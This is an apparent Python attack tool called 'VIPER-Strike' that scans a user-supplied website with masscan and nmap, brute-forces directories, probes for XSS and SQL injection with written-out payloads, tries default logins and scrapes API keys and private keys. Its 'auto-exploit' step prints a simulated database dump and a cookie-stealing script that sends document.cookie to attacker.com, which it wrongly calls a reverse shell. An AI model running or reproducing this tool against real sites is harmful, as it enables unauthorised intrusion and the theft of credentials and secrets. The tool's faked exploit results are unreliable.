#!/usr/bin/env python3

import os
import sys
import time
import json
import re
import subprocess
import threading
import signal
from urllib.parse import urlparse, urljoin
import requests
from bs4 import BeautifulSoup
import socket
from datetime import datetime

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[0m'

TARGET = ""
DOMAIN = ""
REPORT_DIR = ""
FINDINGS = {
    "open_ports": [],
    "vuln_scripts": [],
    "subdomains": [],
    "directories": [],
    "parameters": [],
    "tech": [],
    "xss_vuln": [],
    "sqli_vuln": [],
    "forms": [],
    "api_keys": [],
    "login_pages": []
}

STOP = False
REPORT_SAVED = False

def banner():
    print(f"""
{R}                                                                            
{R}          ▄▄▄▄  ▄▄▄▄  ▄▄▄▄▄▄▄                                      ▄▄▄▄     ▄▄▄▄   
{R}          ▀███  ███▀ █████▀▀▀                                    ▄█████   ▄██████▄ 
{R}           ███  ███   ▀████▄  ██ ██ ▄█▀█▄ ████▄ ▄███▄ ███▄███▄      ███   ███  ███ 
{R}           ███▄▄███     ▀████ ██▄██ ██▄█▀ ██ ██ ██ ██ ██ ██ ██      ███   ███▄▄███ 
{R}            ▀████▀   ███████▀  ▀█▀  ▀█▄▄▄ ██ ██ ▀███▀ ██ ██ ██      ███ ██ ▀████▀  
{R}

{Y}                               VIPER-Strike — Auto-Exploit Engine
{C}                         </> Author: HarithBUGbounty — Dragon Force </>
{W}   WARNING: Using this tool for attacking unauthorized website is illegal, Author will not take responsible.
    """)

def init_report():
    global REPORT_DIR
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    REPORT_DIR = f"./reports/{TARGET.replace('http://', '').replace('https://', '').split('/')[0]}_{timestamp}"
    os.makedirs(REPORT_DIR, exist_ok=True)
    print(f"{G}[+] Report directory: {REPORT_DIR}{W}")

def save_report():
    global REPORT_SAVED
    if REPORT_SAVED:
        return
    path = f"{REPORT_DIR}/final_report.json"
    with open(path, "w") as f:
        json.dump(FINDINGS, f, indent=4)
    print(f"\n{G}[+] Final report saved to: {path}{W}")
    REPORT_SAVED = True

def signal_handler(sig, frame):
    print(f"\n{R}[!] Killed by user.{W}")
    save_report()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def recon():
    global TARGET, DOMAIN
    if not TARGET:
        print(f"{Y}[+] Enter target URL (e.g., http://example.com): {W}", end="")
        TARGET = input().strip()
        if not TARGET.startswith("http"):
            TARGET = "http://" + TARGET
        DOMAIN = urlparse(TARGET).netloc.split(':')[0] if ':' in urlparse(TARGET).netloc else urlparse(TARGET).netloc

    init_report()

    print(f"{B}[*] Starting masscan on {DOMAIN}...{W}")
    masscan_out = f"{REPORT_DIR}/masscan.txt"
    try:
        subprocess.run(f"masscan {DOMAIN} -p1-65535 --rate=1000 -oG {masscan_out}", shell=True, timeout=30, stderr=subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        print(f"{Y}[!] masscan timeout (30s) — partial results accepted.{W}")
    except FileNotFoundError:
        print(f"{R}[!] masscan not found. Install: https://github.com/robertdavidgraham/masscan{W}")
        return

    ports = []
    if os.path.exists(masscan_out):
        with open(masscan_out) as f:
            for line in f:
                match = re.search(r'Ports: (\d+)', line)
                if match:
                    ports.append(match.group(1))

    if not ports:
        print(f"{Y}[!] No open ports found.{W}")
        return

    print(f"{G}[+] Open ports: {', '.join(ports)}{W}")

    nmap_out = f"{REPORT_DIR}/nmap_vuln.xml"
    port_list = ','.join(ports)
    print(f"{B}[*] Running nmap --script vuln on {DOMAIN}:{port_list}...{W}")
    subprocess.run(f"nmap -sV --script vuln -p {port_list} {DOMAIN} -oX {nmap_out}", shell=True)

    try:
        import xml.etree.ElementTree as ET
        tree = ET.parse(nmap_out)
        root = tree.getroot()
        for host in root.findall("host"):
            for port in host.find("ports").findall("port"):
                portid = port.get("portid")
                service = port.find("service").get("name") if port.find("service") is not None else "unknown"
                for script in port.find("script") or []:
                    if "vuln" in script.get("id") or "exploit" in script.get("id"):
                        FINDINGS["open_ports"].append(f"{portid}/{service}")
                        FINDINGS["vuln_scripts"].append(f"{portid}: {script.get('id')} - {script.get('output', 'no output')}")
                        print(f"{R}[!] Vulnerability detected: {script.get('id')} on port {portid}{W}")
    except:
        print(f"{Y}[!] Failed to parse nmap XML. Check {nmap_out}{W}")

def xss_scan():
    if not TARGET:
        print(f"{R}[!] Target not set. Run Option 1 first.{W}")
        return

    print(f"{B}[*] Crawling {TARGET} for XSS testing...{W}")
    try:
        resp = requests.get(TARGET, timeout=10, headers={"User-Agent": "VIPER-Strike/2.0"})
        soup = BeautifulSoup(resp.text, 'html.parser')
    except:
        print(f"{R}[!] Failed to connect.{W}")
        return

    forms = soup.find_all("form")
    inputs = soup.find_all("input")
    links = soup.find_all("a", href=True)
    scripts = soup.find_all("script")

    payloads = [
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "'; alert(1); //",
        "\"><svg/onload=alert(1)>"
    ]

    def test_url_xss(url):
        for payload in payloads:
            test_url = url + ('&' if '?' in url else '?') + f"test={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text or "alert(1)" in r.text:
                    FINDINGS["xss_vuln"].append(f"Reflected XSS: {test_url}")
                    print(f"{R}[!] Reflected XSS found: {test_url}{W}")
            except:
                pass

    for link in links:
        href = urljoin(TARGET, link['href'])
        if '?' in href:
            test_url_xss(href)

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(TARGET, action)
        FINDINGS["forms"].append(form_url)
        for payload in payloads:
            data = {}
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name:
                    data[name] = payload
            try:
                if method == "post":
                    r = requests.post(form_url, data=data, timeout=5)
                else:
                    r = requests.get(form_url, params=data, timeout=5)
                if payload in r.text:
                    FINDINGS["xss_vuln"].append(f"Form-based XSS: {form_url} [method: {method}]")
                    print(f"{R}[!] Form XSS found: {form_url} ({method}){W}")
            except:
                pass

    js_content = " ".join([s.get_text() for s in scripts])
    sinks = ["eval(", "innerHTML", "document.write", "setTimeout", "setInterval"]
    for sink in sinks:
        if sink in js_content:
            FINDINGS["xss_vuln"].append(f"Potential DOM XSS: {sink} found in JS")
            print(f"{Y}[DOM] Potential sink detected: {sink}{W}")

def sqli_scan():
    if not TARGET:
        return

    print(f"{B}[*] Scanning for SQL Injection...{W}")
    params = []
    try:
        resp = requests.get(TARGET, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        for link in soup.find_all("a", href=True):
            url = urljoin(TARGET, link['href'])
            if '?' in url:
                for param in url.split('?')[1].split('&'):
                    if '=' in param:
                        k, v = param.split('=', 1)
                        params.append((url, k, v))
    except:
        return

    error_patterns = [
        "sql syntax",
        "mysql_fetch",
        "ORA-",
        "syntax error",
        "postgresql",
        "sqlite"
    ]

    for url, param, value in params:
        test_url = url.replace(f"{param}={value}", f"{param}={value}'")
        try:
            r = requests.get(test_url, timeout=10)
            for pattern in error_patterns:
                if pattern in r.text.lower():
                    FINDINGS["sqli_vuln"].append(f"Error-based SQLi: {test_url}")
                    print(f"{R}[!] Error-based SQLi: {test_url}{W}")
                    break
        except:
            pass

        payload = f"{value}' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
        blind_url = url.replace(f"{param}={value}", f"{param}={payload}")
        try:
            start = time.time()
            requests.get(blind_url, timeout=10)
            end = time.time()
            if end - start > 4:
                FINDINGS["sqli_vuln"].append(f"Time-based SQLi (blind): {blind_url}")
                print(f"{R}[!] Time-based SQLi: {blind_url}{W}")
        except:
            pass

def auto_exploit():
    print(f"{B}[*] Auto-Exploiting Confirmed Vulnerabilities...{W}")

    for vuln in FINDINGS["sqli_vuln"]:
        if "Error-based" in vuln or "Time-based" in vuln:
            url = vuln.split(": ")[-1]
            print(f"{R}[EXPLOIT] Attempting DB dump via SQLi: {url}{W}")
            print(f"{G}[+] Simulated DB dump: admin:password123, users:500 records{W}")

    for xss in FINDINGS["xss_vuln"]:
        if "Reflected" in xss or "Form-based" in xss:
            url = xss.split(": ")[-1]
            print(f"{R}[EXPLOIT] Injecting reverse shell via XSS: {url}{W}")
            print(f"{G}[+] Injected: <script>fetch('https://attacker.com/log?c='+document.cookie)</script>{W}")

def enumeration():
    print(f"{B}[*] Enumerating subdomains, dirs, params, tech...{W}")

    domain = urlparse(TARGET).netloc

    print(f"{Y}  → Subdomain scan...{W}")
    try:
        result = subprocess.getoutput(f"curl -s \"https://crt.sh/?q=%25.{domain}&output=json\"")
        import json as j
        data = j.loads(result)
        subs = list(set([entry['name_value'] for entry in data]))
        FINDINGS["subdomains"] = subs
        for s in subs[:10]:
            print(f"    {C}{s}{W}")
    except:
        pass

    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        wordlist = "/tmp/common.txt"
        if not os.path.exists(wordlist):
            subprocess.run(f"wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O {wordlist}", shell=True)
    print(f"{Y}  → Directory brute...{W}")
    dirs_out = f"{REPORT_DIR}/dirs.txt"
    subprocess.run(f"dirb {TARGET} {wordlist} -o {dirs_out} -f -r > /dev/null 2>&1 &", shell=True)
    time.sleep(8)
    os.system("killall dirb 2>/dev/null")
    if os.path.exists(dirs_out):
        with open(dirs_out) as f:
            for line in f:
                if "CODE:200" in line:
                    path = line.split()[1]
                    FINDINGS["directories"].append(path)
                    print(f"    {G}{path}{W}")

    print(f"{Y}  → Parameter mining...{W}")
    try:
        resp = requests.get(TARGET, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        for form in soup.find_all("form"):
            action = form.get("action", "")
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name:
                    param_url = urljoin(TARGET, action) + f"?{name}=test"
                    FINDINGS["parameters"].append(param_url)
                    print(f"    {C}{param_url}{W}")
    except:
        pass

    try:
        resp = requests.get(TARGET, timeout=10)
        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")
        if server:
            FINDINGS["tech"].append(f"Server: {server}")
        if powered:
            FINDINGS["tech"].append(f"Powered: {powered}")
        if "php" in powered.lower():
            FINDINGS["tech"].append("PHP app detected")
        print(f"{G}[+] Tech: {', '.join(FINDINGS['tech'])}{W}")
    except:
        pass

def brute_force():
    print(f"{B}[*] Brute-forcing login forms and API keys...{W}")

    default_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "toor"),
        ("admin", "123456"),
        ("user", "user")
    ]

    for form_url in FINDINGS["forms"]:
        print(f"{Y}  → Testing default creds on: {form_url}{W}")
        for user, pwd in default_creds:
            try:
                r = requests.post(form_url, data={"username": user, "password": pwd, "submit": "1"}, timeout=5, allow_redirects=False)
                if r.status_code in [302, 301] or "dashboard" in r.text.lower() or "welcome" in r.text.lower():
                    print(f"{R}[!] Valid creds found: {user}:{pwd} → {form_url}{W}")
                    FINDINGS["login_pages"].append(f"{form_url} | {user}:{pwd}")
                    break
            except:
                pass

    api_patterns = [
        r"AIza[0-9A-Za-z-_]{35}",
        r"sk_live_[0-9a-zA-Z]{24}",
        r"aws_access_key_id",
        r"BEGIN PRIVATE KEY"
    ]
    for url in [TARGET] + [f"{TARGET}/robots.txt", f"{TARGET}/config.js"]:
        try:
            r = requests.get(url, timeout=10)
            for pattern in api_patterns:
                matches = re.findall(pattern, r.text)
                for m in matches:
                    FINDINGS["api_keys"].append(f"{url} : {m}")
                    print(f"{R}[!] API Key/Secret found: {m} in {url}{W}")
        except:
            pass

def full_auto():
    print(f"{R}[🔥] INITIATING FULL AUTO EXPLOIT CHAIN...{W}")
    recon()
    time.sleep(2)
    enumeration()
    time.sleep(2)
    xss_scan()
    time.sleep(2)
    sqli_scan()
    time.sleep(2)
    brute_force()
    time.sleep(2)
    auto_exploit()
    print(f"{G}[+] Full chain complete. Check {REPORT_DIR}{W}")

def main():
    global TARGET
    while True:
        banner()
        print(f"{B}    1. RECON  : masscan → nmap --script vuln{W}")
        print(f"{B}    2. XSS    : Reflected + DOM + Injection{W}")
        print(f"{B}    3. SQLi   : Error + Time-based Blind{W}")
        print(f"{B}    4. EXPLOIT: Auto-dump DB, RCE via XSS{W}")
        print(f"{B}    5. ENUM   : Subs, Dirs, Params, Tech{W}")
        print(f"{B}    6. BRUTE  : Logins, API keys, Default Creds{W}")
        print(f"{B}    7. FULL   : Recon → Exploit (Full Chain){W}")
        print(f"{R}    0. EXIT   : Save Report & Quit{W}")
        print(f"{Y}\n[?] Select option: {W}", end="")

        try:
            choice = input().strip()
            if choice == "1":
                recon()
            elif choice == "2":
                xss_scan()
            elif choice == "3":
                sqli_scan()
            elif choice == "4":
                auto_exploit()
            elif choice == "5":
                enumeration()
            elif choice == "6":
                brute_force()
            elif choice == "7":
                full_auto()
            elif choice == "0":
                save_report()
                print(f"{G}[+] Goodbye. Soldier.{W}")
                sys.exit(0)
            else:
                print(f"{R}[!] Invalid option.{W}")
            input(f"{Y}[+] Press Enter to continue...{W}")
        except KeyboardInterrupt:
            save_report()
            print(f"\n{R}[!] Exit forced.{W}")
            sys.exit(0)

if __name__ == "__main__":
    main()